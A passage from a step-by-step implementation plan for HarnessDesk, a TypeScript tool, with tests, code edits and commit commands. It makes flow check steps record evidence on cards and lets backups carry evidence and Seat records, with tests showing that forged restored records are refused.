3. In the options passed to `new EvidencePlane(…)`, after `seenFile: join(this.#state.directory, SEEN_FILE),`, add `...(options.evidence?.gh ? { gh: options.evidence.gh } : {}),`.
4. In the port passed to `new Team(join(this.#state.directory, 'team'), { … })`, after its `log: (message, details) => this.#logger.warn(message, details ?? {}),`, add:

```ts
      settled: (room, intent) => this.#evidence.settled(room, intent),
```

- [ ] **Step 8: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-observe.test.js packages/server/dist/test/evidence-board.test.js packages/server/dist/test/team.test.js`
Expected: PASS — 7 tests, 8 tests, and every test in `team.test.js` as before.

- [ ] **Step 9: Prove the tests can fail**

Run each, watch the named test go red, and restore:

1. In `observe`, replace the `const changed = facts.filter(…)` line with `const changed = facts`: `a look records the branch's diff, pull request and checks once, and again only what changed` fails.
2. In `observe`, change `if ((await projectOf(look.cwd)) !== look.project) {` to `if (false) {`: `a checkout outside the room's project is not looked at` fails.
3. In `team.ts` `complete()`, delete the `this.#port.settled?.(…)` line: `through the host: a card its holder finishes leaves the diff it was finished at, by its Seat` fails after its five-second wait.
4. In `forge.ts`, change `['SKIPPED', 'NEUTRAL', 'STALE']` to `['NEUTRAL', 'STALE']`: `the forge's answer is read as a pull request and the checks it ran…` fails on `docs`.
5. In `#lookAround`, drop `!one.restored &&`: `a fact a backup brought never says where the desk looks` fails — card 1 was taken, to be looked at where the backup said.
6. In `observe`, delete `if (line.record.restored) continue`: `what a backup brought never stands for what this desk observed…` fails — the restored copies stood for the desk's own look, and nothing was recorded.

- [ ] **Step 10: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/forge.ts packages/server/src/evidence/observe.ts packages/server/src/evidence/plane.ts packages/server/src/team.ts packages/server/src/host.ts packages/server/test/evidence-observe.test.ts
git commit -m "feat(evidence): the desk observes a card's diff, pull request and CI

When a card is finished, and on a board read at most once every five
minutes a card, the desk reads the branch's diff and — with the person's own
gh, in the checkout — its pull request and the forge's checks on its head,
and records only what changed. A checkout outside the room's project is not
looked at, and what an agent says it opened is never taken for what is there.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 13: A flow's check leaves evidence

A flow's check step runs as it always has — its command shown verbatim in the flow's dry run and named in its start dialog before anything is seated — and now, when it is for a card, what it observed is recorded as that card's check evidence, named for its role, in its round, bound to the commit it started at. This task runs nothing new: the command goes through the flow's own runner, unchanged until phase 6 moves flows onto `run.ts`; it only records what that runner answered. The flow is answered exactly as its runner answered, whether or not the record could be written.

**Files:**
- Modify: `packages/server/src/evidence/plane.ts` (`flowCheck`)
- Modify: `packages/server/src/flows.ts` (`FlowPort.run` learns which card; `#runChecks` says it)
- Modify: `packages/server/src/host.ts` (the flow port's `run`)
- Test: `packages/server/test/evidence-flow-check.test.ts` (new)

**Proof needs:** neither

**Interfaces:**
- Consumes: `revisionOf`, `projectOf` (Task 3); `mintId` (Task 2); `EvidencePlane.announce` (Task 10); `runCheck` (`packages/server/src/flows.ts`, unchanged).
- Produces: `FlowPort.run(command, where: { cwd; timeoutSec; card?: { room: string; intent: number; name: string; round: number } })`; `EvidencePlane.flowCheck(command, where, run): Promise<{ status: number | null }>`.

- [ ] **Step 1: Write the failing tests**

Create `packages/server/test/evidence-flow-check.test.ts`:

```ts
import assert from 'node:assert/strict'
import { join } from 'node:path'
import { test } from 'node:test'

import type { BoardEvidence, FlowRun, TeamState, WireNotification } from '@harnessdesk/protocol'

import { EvidencePlane } from '../src/evidence/plane.js'
import { canonical } from '../src/evidence/revision.js'
import { evidenceDesk, makeRepo, until } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * A flow's check step leaves check evidence on its card, as a named check does:
 * every run the desk makes leaves a fact without being asked.
 */

test("a flow's check is recorded on its card, in its round, bound to the commit it started at", async () => {
  const repo = await makeRepo()
  const state = tempDir('hd-flow-check-state-')
  const heard: WireNotification[] = []
  const plane = new EvidencePlane(
    { dir: join(state, 'evidence'), seenFile: join(state, 'seen.json'), now: () => 42 },
    {
      board: (room) => (room === 'room-1' ? ({ id: 'room-1', root: repo.dir, intents: [] } as unknown as TeamState) : null),
      cwdOf: () => null,
      push: (notification) => void heard.push(notification),
      log: () => {},
    },
  )
  const ran: string[] = []
  const answer = await plane.flowCheck(
    'pnpm test',
    { cwd: repo.dir, timeoutSec: 60, card: { room: 'room-1', intent: 5, name: 'gate', round: 2 } },
    async (command) => {
      ran.push(command)
      return { status: 1 }
    },
  )
  assert.deepEqual(answer, { status: 1 }, 'the flow is answered exactly as its runner answered')
  assert.deepEqual(ran, ['pnpm test'])
  const facts = (await plane.store.read(await canonical(repo.dir), 'evidence')).lines
  assert.equal(facts.length, 1)
  assert.ok(facts[0]?.type === 'evidence')
  const record = facts[0].record
  assert.deepEqual(record.fact, {
    kind: 'check',
    name: 'gate',
    run: 'pnpm test',
    exit: 1,
    timedOut: false,
    at: await repo.git('rev-parse', 'HEAD'),
    dirty: false,
    tail: '',
  })
  assert.deepEqual([record.card, record.round, record.seat, record.observedAt], [{ board: 'room-1', id: 5 }, 2, null, 42])
  await until(() => heard.find((one) => one.method === 'evidence/changed') ?? null, 'the evidence/changed notice')

  // A check step for no card — the flow engine's own runner, asked directly — leaves nothing.
  await plane.flowCheck('pnpm test', { cwd: repo.dir, timeoutSec: 60 }, async () => ({ status: 0 }))
  assert.equal((await plane.store.read(await canonical(repo.dir), 'evidence')).lines.length, 1)
})

const GATE = `
name: Gate
roles:
  gate:
    kind: check
    check:
      run: "true"
      exits:
        "0": pass
      otherwise: fail
    outcomes: [pass, fail]
seed:
  role: gate
  title: Run the gate
`

test("through the host: a flow's check step leaves a check fact on its card", async (t) => {
  const { host, repo } = await evidenceDesk(t)
  const room = (await host.call('team/room/create', { root: repo.dir, name: 'Gate' })) as TeamState
  const run = (await host.call('flow/start', { room: room.id, source: GATE })) as FlowRun
  const board = await until(async () => {
    const read = (await host.call('evidence/board', { room: room.id })) as BoardEvidence
    return read.cards.length > 0 ? read : null
  }, "the gate's check fact")
  const fact = board.cards[0]?.facts[0]?.record
  assert.equal(fact?.fact.kind, 'check')
  assert.equal(fact?.fact.kind === 'check' ? [fact.fact.name, fact.fact.run, fact.fact.exit].join(' ') : '', 'gate true 0')
  assert.equal(fact?.round, 1)
  await host.call('flow/stop', { run: run.id })
})
```

- [ ] **Step 2: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Property 'flowCheck' does not exist on type 'EvidencePlane'`.

- [ ] **Step 3: The plane records a flow's check**

In `packages/server/src/evidence/plane.ts`:

1. Change `import { projectOf } from './revision.js'` to `import { projectOf, revisionOf } from './revision.js'`, and directly above it add `import { mintId } from './records.js'`.
2. Add above `close()`:

```ts
  /**
   * A flow's check step, run as the flow engine always runs one — its command
   * was shown verbatim in the flow's dry run and named in its start dialog
   * before anything was seated — and, when it is for a card, recorded as that
   * card's check evidence, bound to the commit it started at, in its round.
   * The flow's runner keeps no output and does not tell a timeout from a
   * command that never started; phase 6 moves flows onto `run.ts`.
   */
  async flowCheck(
    command: string,
    where: {
      readonly cwd: string
      readonly timeoutSec: number
      readonly card?: { readonly room: string; readonly intent: number; readonly name: string; readonly round: number }
    },
    run: (command: string, where: { readonly cwd: string; readonly timeoutSec: number }) => Promise<{ readonly status: number | null }>,
  ): Promise<{ readonly status: number | null }> {
    const card = where.card
    const revision = card ? await revisionOf(where.cwd) : null
    const result = await run(command, { cwd: where.cwd, timeoutSec: where.timeoutSec })
    const board = card ? this.#port.board(card.room) : null
    if (!card || !revision || !board) return result
    const project = await projectOf(board.cwd ?? board.root)
    await this.store
      .append(project, 'evidence', [
        {
          type: 'evidence',
          record: {
            id: mintId(),
            fact: {
              kind: 'check',
              name: card.name,
              run: command,
              exit: result.status,
              timedOut: result.status === null,
              at: revision.head,
              dirty: revision.dirty,
              tail: '',
            },
            card: { board: card.room, id: card.intent },
            checkout: { cwd: where.cwd, branch: revision.branch },
            seat: null,
            round: card.round,
            observedAt: this.#now(),
            posted: null,
          },
        },
      ])
      .then(
        () => this.announce(card.room),
        (error: unknown) =>
          this.#port.log("a flow check's result could not be recorded", {
            room: card.room,
            card: card.intent,
            error: error instanceof Error ? error.message : String(error),
          }),
      )
    return result
  }

```

- [ ] **Step 4: A flow says which card its check is for**

In `packages/server/src/flows.ts`:

1. In `interface FlowPort`, replace the `run` member and its comment with:

```ts
  /**
   * Runs a check's command. Resolves with its exit status, or null if it ran
   * over. `card` says which card and round it is for, so the desk can record
   * what it observed as that card's check evidence.
   */
  run(
    command: string,
    where: {
      readonly cwd: string
      readonly timeoutSec: number
      readonly card?: { readonly room: string; readonly intent: number; readonly name: string; readonly round: number }
    },
  ): Promise<{ readonly status: number | null }>
```

2. In `#runChecks`, replace `const { status } = await this.#port.run(check.run, { cwd, timeoutSec: check.timeout })` with:

```ts
      const { status } = await this.#port.run(check.run, {
        cwd,
        timeoutSec: check.timeout,
        card: { room: run.room, intent, name: role.id, round: round.n },
      })
```

- [ ] **Step 5: The host runs it through the plane**

In `packages/server/src/host.ts`, in the port passed to `new Flows(…)`, replace `run: (command, where) => runCheck(command, where),` with:

```ts
      run: (command, where) => this.#evidence.flowCheck(command, where, runCheck),
```

- [ ] **Step 6: Run the tests to see them pass**

Run: `pnpm run build:node && node --test --test-reporter=spec packages/server/dist/test/evidence-flow-check.test.js packages/server/dist/test/flows.test.js`
Expected: PASS — 2 tests, and every test in `flows.test.js` as before.

- [ ] **Step 7: Prove the tests can fail**

1. In `flowCheck`, delete the `await this.store.append(…).then(…)` statement, from `await this.store` to its closing `)`: both tests fail — the first on `facts.length`, the host test after its five-second wait. Restore it.
2. In `flows.ts` `#runChecks`, delete the `card: { … },` line: `through the host: a flow's check step leaves a check fact on its card` fails. Restore it.

- [ ] **Step 8: Commit**

```bash
cd "$(git rev-parse --show-toplevel)"
mkdir -p /tmp/hdv && TMPDIR=/tmp/hdv pnpm verify; echo "verify exit: $?"
git add packages/server/src/evidence/plane.ts packages/server/src/flows.ts packages/server/src/host.ts packages/server/test/evidence-flow-check.test.ts
git commit -m "feat(evidence): a flow's check step leaves check evidence on its card

The flow runs its check exactly as before, through its own runner; when the
step is for a card, what it answered is recorded as that card's check fact,
named for its role, in its round, bound to the commit it started at. The
flow is answered as its runner answered, whether or not the record could be
written.

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

Expected: `verify exit: 0` before the commit.

---

### Task 14: A backup carries evidence and Seat records

A backup carries each project's evidence store, as the lines it holds, and a restore adds them the way phase 2's Task 10 restores everything else (its corrections 8–12) — with one more rule, because these records are evidence: **what this desk wrote always wins, and a backup's records are history.**

- **One rule.** Every line is read by the store's own `lineOf`, where it is going — its file and its project (Task 2) — so a restore never writes a line the store would then skip, and the store never exports one a restore would refuse.
- **Marked, and never observed here.** Every restored record is written with `restored: { at }` (or keeps the mark it came with). A restored fact stands as unknown on the board and never makes a card *Ready*; the desk's own observation of the same question answers it, whatever time the restored one claims (Task 10). A restored Seat is drawn, and never says which Agent a conversation here is (Tasks 4 and 6).
- **What this desk kept is never touched.** A record already here, by id, is a duplicate and left as it is. A Seat is refused for a conversation this desk already keeps a Seat for. A closing is admitted only for a Seat opened in the same entry of the same backup and restored beside it — so a backup can never close a Seat this desk kept.
- **One step.** Each file is read, judged and appended as one queued `merge` of the store's (Task 2), so two restores at once — or a restore and a normal write — cannot both add a record.
- **Bounded.** A restore reads at most `RESTORE_PROJECT_LIMIT` (200) projects and `RESTORE_LINE_LIMIT` (100,000) lines, and no line over `LINE_LIMIT`; the rest are refused and counted, and nothing is made for them. The whole file is already bounded by the one message that carries it — the host's WebSocket admits at most `ws`'s default 100 MiB.
- **Counted apart.** The report says how many were restored, how many were already here (`duplicate`), how many were refused — unreadable, from another project, past a limit, or not a backup's to write — and how many could not be written (`failed`); a restore that refused or failed any logs *a backup was restored in part* with the counts. One line, or one project, that cannot be restored never stops the rest.
- **An export says what it left out.** A line the exporting build cannot read — a newer build's, or damaged — is left out and counted (`unreadable`), and the export's sentence says so.

What a person has approved on this machine never travels: `commands-seen.json` and its key are in no backup, and nothing a backup says can approve a command.

**Files:**
- Modify: `packages/protocol/src/wire.ts` (`BackupFile.evidence`, `BackupReport.evidence`)
- Modify: `packages/server/src/evidence/plane.ts` (`backup`, `restore`), `packages/server/src/host.ts` (export and import)
- Create: `packages/ui/src/lib/backup-words.ts` — General › Backup's two sentences, moved out of `Settings.tsx` so they can be tested, and counting evidence
- Modify: `packages/ui/src/components/Settings.tsx` (`BackupRows` uses them; its description)
- Test: `packages/server/test/evidence-backup.test.ts` (new), `packages/ui/src/lib/backup-words.test.ts` (new)
- Test, named edit: `packages/server/test/backup.test.ts` — its pinned key list gains `'evidence'`, since every backup now carries the field

**Proof needs:** neither

**Interfaces:**
- Consumes: `lineOf`, `idOfLine`, `LINE_LIMIT`, `LINE_VERSION`, `type StoredLine`, `type StoreFile` (Task 2); `EvidenceStore.projects`, `read`, `merge`, `type Admit` (Task 2); `SeatBook.load` (Task 4); phase 2's `BackupRows` and its `count` helper (phase 2 Task 11).
- Produces: `BackupFile.evidence?: readonly { project: string; seats: readonly unknown[]; facts: readonly unknown[]; unreadable?: number }[]`; `BackupReport.evidence: { restored: number; duplicate: number; refused: number; failed: number }`; `RESTORE_PROJECT_LIMIT = 200`, `RESTORE_LINE_LIMIT = 100_000`; `EvidencePlane.backup(): Promise<NonNullable<BackupFile['evidence']>>`; `EvidencePlane.restore(entries: unknown): Promise<{ restored; duplicate; refused; failed }>`; from `backup-words.ts`, `count(n, noun)`, `exportedSentence(backup: BackupFile)`, `restoredSentence(report: BackupReport)`.

- [ ] **Step 1: Confirm the anchors**

Run: `grep -n "const count = \|setOutcome(\|Runtimes, your Agents" packages/ui/src/components/Settings.tsx`
Expected: phase 2's Task 11 `count` helper above `BackupRows`, the export and restore `setOutcome(` calls inside it, and the row description `Runtimes, your Agents and their seats on this Mac, preferences and transcripts in one file — sign in again after restoring.` If any differs, stop and report: this task edits the words phase 2 wrote.

Run: `grep -n "seating: await this.#machineSeating.raw()\|this.#logger.info('backup restored'" packages/server/src/host.ts`
Expected: one line each, in `#backupExport` and `#backupImport` as phase 2's Task 10 left them.

- [ ] **Step 2: Write the failing tests**

1. Create `packages/server/test/evidence-backup.test.ts`:

```ts
import assert from 'node:assert/strict'
import { appendFile } from 'node:fs/promises'
import { join } from 'node:path'
import { test } from 'node:test'

import type { BackupFile, BackupReport, EvidenceRecord, SeatRecord, Session } from '@harnessdesk/protocol'

import { RESTORE_LINE_LIMIT, RESTORE_PROJECT_LIMIT } from '../src/evidence/plane.js'
import type { SeatOpening } from '../src/evidence/records.js'
import { canonical } from '../src/evidence/revision.js'
import { CommandsSeen, incarnationOf, SEEN_FILE } from '../src/evidence/seen.js'
import { EvidenceStore } from '../src/evidence/store.js'
import { evidenceDesk, makeRepo, writeAgent } from './fixtures/evidence-desk.js'
import { tempDir } from './scratch.js'

/*
 * General › Backup carries what the desk observed and every Seat it kept, and a
 * restore adds them the way it adds everything else — except that here, what
 * this desk wrote always wins. A restored record is history: marked as such,
 * never able to close or stand in for a Seat this desk kept, and never a fact
 * the desk observed. One bad record never stops the rest, and every record is
 * read by the same rule the store reads with. A backup never carries what a
 * person approved on this machine.
 */

const fact = (id: string, at: string, cwd: string, over: Partial<EvidenceRecord> = {}): EvidenceRecord => ({
  id,
  fact: { kind: 'check', name: 'verify', run: 'pnpm verify', exit: 0, timedOut: false, at, dirty: false, tail: '' },
  card: { board: 'room-1', id: 1 },
  checkout: { cwd, branch: 'main' },
  seat: null,
  round: null,
  observedAt: 1,
  posted: null,
  ...over,
})

/** A whole Seat opening, as a store holds it, kept under `project`. */
const opening = (id: string, project: string, over: Partial<SeatOpening> = {}): SeatOpening => ({
  id,
  agent: { id: 'scout', name: 'Scout', origin: 'user' },
  briefDigest: 'digest-1',
  seat: { runtime: 'fake' },
  seatLabel: 'Fake Runtime',
  passedOver: [],
  standing: { kind: 'permission', permission: 'read' },
  ceiling: null,
  checkout: { cwd: project, project, branch: 'main', head: 'a'.repeat(40) },
  session: { runtime: 'fake', sessionId: `session-${id}` },
  board: null,
  role: null,
  openedAt: 1,
  ...over,
})

/** A backup holding only evidence. */
const backupOf = (evidence: NonNullable<BackupFile['evidence']>): BackupFile => ({
  kind: 'harnessdesk-backup',
  version: 1,
  exportedAt: 1,
  hostVersion: '9.9.9',
  agents: [],
  preferences: {},
  transcripts: [],
  evidence,
})

const ids = (lines: readonly { type: string; record?: { id: string } }[]): string[] =>
  lines.flatMap((line) => (line.record ? [line.record.id] : []))

test('a backup carries every Seat and every fact, and a restore on another desk adds them once, as history', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const a = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-evidence-a-'), repo })
  await writeAgent(a.stateDir)
  const session = (await a.host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session
  const seat = (await a.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  await new EvidenceStore(join(a.stateDir, 'evidence')).append(project, 'evidence', [
    { type: 'evidence', record: fact('fact-1', await repo.git('rev-parse', 'HEAD'), repo.dir) },
  ])

  const backup = (await a.host.call('backup/export', {})) as BackupFile
  assert.deepEqual(
    backup.evidence?.map((one) => [one.project, one.seats.length, one.facts.length, one.unreadable]),
    [[project, 1, 1, 0]],
  )

  const b = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-evidence-b-'), repo })
  const report = (await b.host.call('backup/import', { backup })) as BackupReport
  assert.deepEqual(report.evidence, { restored: 2, duplicate: 0, refused: 0, failed: 0 })
  const restored = (await b.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  assert.ok(restored.restored && Number.isFinite(restored.restored.at), 'marked as brought by a backup')
  assert.deepEqual({ ...restored, restored: null }, { ...seat, restored: null }, 'and otherwise the record, whole')
  const facts = (await new EvidenceStore(join(b.stateDir, 'evidence')).read(project, 'evidence')).lines
  assert.deepEqual(ids(facts), ['fact-1'])
  assert.ok(facts[0]?.type === 'evidence' && facts[0].record.restored, 'a fact from a backup was not observed here')

  const again = (await b.host.call('backup/import', { backup })) as BackupReport
  assert.deepEqual(again.evidence, { restored: 0, duplicate: 2, refused: 0, failed: 0 }, 'twice is the same as once')
})

test('a Seat a backup brought never says which Agent a conversation on this desk is', async (t) => {
  const repo = await makeRepo()
  const a = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-dress-a-'), repo })
  await writeAgent(a.stateDir)
  const session = (await a.host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session
  const backup = (await a.host.call('backup/export', {})) as BackupFile

  const b = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-dress-b-'), repo })
  await b.host.call('backup/import', { backup })
  // The record is there, as history…
  const record = (await b.host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  assert.ok(record.restored)
  // …and the same conversation, opened here, is a plain one: this desk never seated it.
  const opened = (await b.host.call('session/resume', { runtime: session.runtime, sessionId: session.id })) as Session
  assert.equal(opened.settings?.agent, undefined)
  assert.equal(b.host.registry.get(session.runtime, session.id)?.seatedAs ?? null, null)
})

test('an export says how many lines it could not read, and so left out', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const a = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-unreadable-'), repo })
  const store = new EvidenceStore(join(a.stateDir, 'evidence'))
  await store.append(project, 'evidence', [{ type: 'evidence', record: fact('fact-1', await repo.git('rev-parse', 'HEAD'), repo.dir) }])
  await appendFile(join(store.folderOf(project), 'evidence.ndjson'), '{"v":2,"type":"evidence","record":{"id":"from-later"}}\n')
  const backup = (await a.host.call('backup/export', {})) as BackupFile
  assert.deepEqual(backup.evidence?.map((one) => [one.facts.length, one.unreadable]), [[1, 1]])
})

test('one bad record never stops the rest: what cannot be read here, or claims another project, is refused and counted', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const at = await repo.git('rev-parse', 'HEAD')
  const { host, stateDir } = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-evidence-'), repo })
  const good = { v: 1, type: 'evidence', record: fact('good', at, repo.dir) }
  const report = (await host.call('backup/import', {
    backup: backupOf([
      {
        project,
        seats: [
          // Whole, and readable — but kept under another project than the one it is restored into.
          { v: 1, type: 'seat', record: opening('elsewhere', '/somewhere/else') },
          { v: 1, type: 'seat', record: opening('here', project) },
        ],
        facts: [
          good,
          { v: 1, type: 'evidence', record: { ...fact('bad', at, repo.dir), fact: { kind: 'check', at: 'HEAD' } } },
          'not a line',
          // A Seat filed with the facts: the store would never read it there, so a restore never writes it there.
          { v: 1, type: 'seat', record: opening('misfiled', project) },
        ],
      },
      { project: 'relative/path', seats: [], facts: [good] },
    ]),
  })) as BackupReport
  assert.deepEqual(report.evidence, { restored: 2, duplicate: 0, refused: 5, failed: 0 })
  const store = new EvidenceStore(join(stateDir, 'evidence'))
  assert.deepEqual(ids((await store.read(project, 'evidence')).lines), ['good'])
  assert.deepEqual(ids((await store.read(project, 'seats')).lines), ['here'])
})

test('a backup can never close, replace or outrank a Seat this desk kept', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const { host, stateDir } = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-trust-'), repo })
  await writeAgent(stateDir)
  const session = (await host.call('agent/seat', { id: 'scout', cwd: repo.dir })) as Session
  const kept = (await host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) })) as SeatRecord
  const { closed: _closed, ...keptOpening } = kept

  const report = (await host.call('backup/import', {
    backup: backupOf([
      {
        project,
        seats: [
          // A closing for the Seat this desk kept, carried beside a copy of its opening.
          { v: 1, type: 'seat', record: keptOpening },
          { v: 1, type: 'seat-closed', closing: { seat: kept.id, at: 5, why: 'deleted' } },
          // A second Seat for the same conversation, said to be opened later, as another Agent.
          {
            v: 1,
            type: 'seat',
            record: opening('forged', project, {
              agent: { id: 'mallory', name: 'Mallory', origin: 'user' },
              session: kept.session,
              openedAt: kept.openedAt + 1_000,
            }),
          },
          // A Seat for a conversation this desk never kept, closed beside its own opening: history, admitted.
          { v: 1, type: 'seat', record: opening('theirs', project) },
          { v: 1, type: 'seat-closed', closing: { seat: 'theirs', at: 9, why: 'deleted' } },
        ],
        facts: [],
      },
    ]),
  })) as BackupReport
  assert.deepEqual(report.evidence, { restored: 2, duplicate: 1, refused: 2, failed: 0 })
  assert.deepEqual(
    await host.call('evidence/seat', { runtime: 'fake', sessionId: String(session.id) }),
    kept,
    'still open, and still the Agent this desk seated',
  )
  assert.equal(host.registry.get(session.runtime, session.id)?.seatedAs?.agent, 'scout')
  const theirs = (await host.call('evidence/seat', { runtime: 'fake', sessionId: 'session-theirs' })) as SeatRecord
  assert.deepEqual([theirs.closed, Boolean(theirs.restored)], [{ at: 9, why: 'deleted' }, true])
})

test('two restores at once add each record once', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const at = await repo.git('rev-parse', 'HEAD')
  const { host, stateDir } = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-race-'), repo })
  const facts = Array.from({ length: 20 }, (_, n) => ({ v: 1, type: 'evidence', record: fact(`fact-${n}`, at, repo.dir) }))
  const backup = backupOf([{ project, seats: [{ v: 1, type: 'seat', record: opening('one', project) }], facts }])
  const [first, second] = (await Promise.all([
    host.call('backup/import', { backup }),
    host.call('backup/import', { backup }),
  ])) as BackupReport[]
  assert.equal(first!.evidence.restored + second!.evidence.restored, 21)
  assert.equal(first!.evidence.duplicate + second!.evidence.duplicate, 21)
  const store = new EvidenceStore(join(stateDir, 'evidence'))
  assert.equal((await store.read(project, 'evidence')).lines.length, 20)
  assert.equal((await store.read(project, 'seats')).lines.length, 1)
})

test('a restore reads no more than its limits: projects past the first ones, and lines past the budget, are refused', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const at = await repo.git('rev-parse', 'HEAD')
  const { host, stateDir } = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-limits-'), repo })
  const good = (id: string) => ({ v: 1, type: 'evidence', record: fact(id, at, repo.dir) })
  // Projects: every one past the limit is refused, whatever it holds, and no folder is made for it.
  const crowd = Array.from({ length: RESTORE_PROJECT_LIMIT }, (_, n) => ({ project: `/nowhere/${n}`, seats: [], facts: [] }))
  const past = (await host.call('backup/import', {
    backup: backupOf([...crowd, { project, seats: [], facts: [good('late')] }]),
  })) as BackupReport
  assert.deepEqual(past.evidence, { restored: 0, duplicate: 0, refused: 1, failed: 0 })
  assert.deepEqual(await new EvidenceStore(join(stateDir, 'evidence')).projects(), [])

  // Lines: each counts against the budget whether or not it can be read.
  const junk = Array.from({ length: RESTORE_LINE_LIMIT }, () => 'x')
  const over = (await host.call('backup/import', {
    backup: backupOf([{ project, seats: [], facts: [...junk, good('last')] }]),
  })) as BackupReport
  assert.deepEqual(over.evidence, { restored: 0, duplicate: 0, refused: RESTORE_LINE_LIMIT + 1, failed: 0 })
})

test('what a person approved on this machine never travels in a backup, and a backup cannot say it was approved', async (t) => {
  const repo = await makeRepo()
  const project = await canonical(repo.dir)
  const scope = { project, incarnation: await incarnationOf(project), digest: 'b'.repeat(40) }
  const a = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-seen-a-'), repo })
  await new CommandsSeen(join(a.stateDir, SEEN_FILE)).approve(scope, { name: 'verify', run: 'pnpm verify' })
  const backup = (await a.host.call('backup/export', {})) as BackupFile
  assert.equal(JSON.stringify(backup).includes('pnpm verify'), false, 'the command a person approved is not in it')

  const b = await evidenceDesk(t, {}, { stateDir: tempDir('hd-backup-seen-b-'), repo })
  const forged = { ...backup, preferences: { ...backup.preferences, commandsSeen: [{ project, name: 'verify', run: 'pnpm verify', at: 1 }] } }
  await b.host.call('backup/import', { backup: forged })
  assert.equal(await new CommandsSeen(join(b.stateDir, SEEN_FILE)).approved(scope, { name: 'verify', run: 'pnpm verify' }), false)
})
```

2. Create `packages/ui/src/lib/backup-words.test.ts`:

```ts
import { expect, it } from 'vitest'

import type { BackupFile, BackupReport } from '@harnessdesk/protocol'

import { count, exportedSentence, restoredSentence } from './backup-words'

/* General › Backup's two sentences: every store counted, evidence among them. */

const report = (over: Partial<BackupReport> = {}): BackupReport => ({
  agents: { restored: 2, skipped: 0 },
  preferences: 3,
  transcripts: { restored: 4, skipped: 0 },
  agentFolders: { restored: 1, skipped: 0 },
  seating: { restored: 1, skipped: 0 },
  evidence: { restored: 12, duplicate: 0, refused: 0, failed: 0 },
  ...over,
})

const backup = (evidence: BackupFile['evidence']): BackupFile => ({
  kind: 'harnessdesk-backup',
  version: 1,
  exportedAt: 1,
  hostVersion: '1.0.0',
  agents: [{ id: 'fake' }],
  preferences: {},
  transcripts: [],
  agentFolders: [],
  seating: null,
  ...(evidence ? { evidence } : {}),
})

it('a restore counts what the desk observed beside everything else it added', () => {
  expect(restoredSentence(report())).toBe(
    'Restored 2 runtimes, 1 Agent, 1 seat choice, 3 preferences, 4 conversations and 12 records of what the desk observed.',
  )
  expect(count(1, 'record')).toBe('1 record')
})

it('what was already here is counted once, evidence included', () => {
  expect(restoredSentence(report({ transcripts: { restored: 4, skipped: 1 }, evidence: { restored: 0, duplicate: 5, refused: 0, failed: 0 } }))).toBe(
    'Restored 2 runtimes, 1 Agent, 1 seat choice, 3 preferences, 4 conversations and 0 records of what the desk observed. 6 already here or newer, left alone.',
  )
})

it('what a restore refused and what it could not write are said apart, never as already here', () => {
  expect(restoredSentence(report({ evidence: { restored: 3, duplicate: 0, refused: 2, failed: 1 } }))).toBe(
    'Restored 2 runtimes, 1 Agent, 1 seat choice, 3 preferences, 4 conversations and 3 records of what the desk observed. 2 records refused: this desk could not read them, or a backup may not write them here. 1 record could not be written.',
  )
})

it('an export counts the records it carries, and a backup from before evidence carries none', () => {
  expect(exportedSentence(backup([{ project: '/work/repo', seats: [{}, {}], facts: [{}] }]))).toBe(
    'Exported 1 runtime, 0 Agents of yours, 0 conversations and 3 records of what the desk observed.',
  )
  expect(exportedSentence(backup(undefined))).toBe(
    'Exported 1 runtime, 0 Agents of yours, 0 conversations and 0 records of what the desk observed.',
  )
})

it('an export that left out lines it could not read says so', () => {
  expect(exportedSentence(backup([{ project: '/work/repo', seats: [{}], facts: [{}], unreadable: 2 }]))).toBe(
    'Exported 1 runtime, 0 Agents of yours, 0 conversations and 2 records of what the desk observed. 2 records this build cannot read were left out.',
  )
})
```

3. In `packages/server/test/backup.test.ts`, the pinned key list — the one assertion of `Object.keys(backup).sort()` — gains `'evidence'` after `'agents'`:

```ts
    ['agentFolders', 'agents', 'evidence', 'exportedAt', 'hostVersion', 'kind', 'preferences', 'seating', 'transcripts', 'version'],
```

This is an edit to a test this task was not asked to write: the list pins every key a backup carries, and a backup now carries one more.

- [ ] **Step 3: Run them to see them fail**

Run: `pnpm run build:node`
Expected: FAIL — `Property 'evidence' does not exist on type 'BackupFile'` (and on `BackupReport`).

Run: `pnpm --filter @harnessdesk/ui exec vitest run src/lib/backup-words.test.ts`
Expected: FAIL — `Failed to resolve import "./backup-words"`.

- [ ] **Step 4: The fields, on the wire**

In `packages/protocol/src/wire.ts`:

1. In `interface BackupFile`, after `seating` and its comment, add:

```ts
  /**
   * What the desk observed and every Seat it kept: each project's evidence
   * store, as the lines it holds. Never the commands this machine has approved —
   * those are this machine's alone, and no backup carries them. Absent in a
   * backup from before it existed.
   */
  readonly evidence?: readonly {
